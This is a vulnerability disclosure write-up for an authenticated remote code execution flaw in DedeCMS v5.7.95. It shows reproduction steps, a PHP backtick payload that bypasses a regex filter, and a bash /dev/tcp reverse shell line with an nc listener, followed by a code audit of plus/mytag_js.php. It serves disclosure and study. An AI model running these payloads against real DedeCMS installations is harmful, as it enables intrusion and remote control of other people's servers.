[toc]

# DedeCMS v5.7.95 RCE

Dedecms official website：https://www.dedecms.com/download。

## Vulnerability description

There is an arbitrary command execution vulnerability in the background of dedecms v5.7.95, which can write malicious code and cause rce vulnerability.



## Vulnerability impact

DedeCMS v5.7.95



## Recurrence process

First visit /dede to log in to the background.

Visit `dede/mytag_ main.php`, inserts a tag.

![image-20220621000017225](https://raw.githubusercontent.com/Airrudder/picbed/master/image-20220621000017225.png)

The main contents are as follows:

```php
<<?=`ls`;?>
```

The backquote(\`) is actually the alias of the shell_exec function:

![image-20220620235742551](https://raw.githubusercontent.com/Airrudder/picbed/master/image-20220620235742551.png)

Click "OK" to get the corresponding number, which is marked as 3 this time. Visit /plus/mytag_js.php?arcID=3&nocache=1, where `arcID=3` is the tag number. After that, the file a will be generated and directly included.

![image-20220621001339740](https://raw.githubusercontent.com/Airrudder/picbed/master/image-20220621001339740.png)

Further use to reverse shell:

```php
<<?=`bash -i &>/dev/tcp/127.0.0.1/2333 <&1`;?>
```

![image-20220621001414973](https://raw.githubusercontent.com/Airrudder/picbed/master/image-20220621001414973.png)

use ncat:

```bash
nc -lvvp 2333
```

Visit /plus/mytag_js.php?arcID=3&nocache=1 to reverse the shell successfully:

![image-20220621001633221](https://raw.githubusercontent.com/Airrudder/picbed/master/image-20220621001633221.png)



## Code audit

Vulnerability location is in `plus/mytag_js.php`, you can see that the file contains directly after the file is written. In this case, we don't have to care about the file name. Here, the file name has a fixed htm suffix. We need to care about what the myvalues content is when the file is written.

![image-20220621001801902](https://raw.githubusercontent.com/Airrudder/picbed/master/image-20220621001801902.png)

The value of myvalues is found through query. The query statements are:

```sql
SELECT * FROM `#@__mytag` WHERE aid='$aid' 
```

![image-20220621001953888](https://raw.githubusercontent.com/Airrudder/picbed/master/image-20220621001953888.png)

You can search globally to get the information in mytag_add.php or mytag_edit.php. These two files involve the insertion or update of tables.

![image-20220621002146874](https://raw.githubusercontent.com/Airrudder/picbed/master/image-20220621002146874.png)

So visit mytag_main.php, here are add and edit operations

![image-20220621002256500](https://raw.githubusercontent.com/Airrudder/picbed/master/image-20220621002256500.png)

a lot of malicious functions are filtered in plus/mytag_js.php, but the backquotes(\`) are not filtered, and they cannot match `[^<]+<\?(php|=)`：

```php
// will be matched
abcde<?php `ls`;?>
<?=`ls`;?>

// will not be matched
<<?=`ls`?>
```

Use  `<<`  to bypass `[^<]+<\?(php|=)`, thus rce succeeds.

![image-20220621002749384](https://raw.githubusercontent.com/Airrudder/picbed/master/image-20220621002749384.png)

See the "Recurrence process" above for specific operation and utilization.
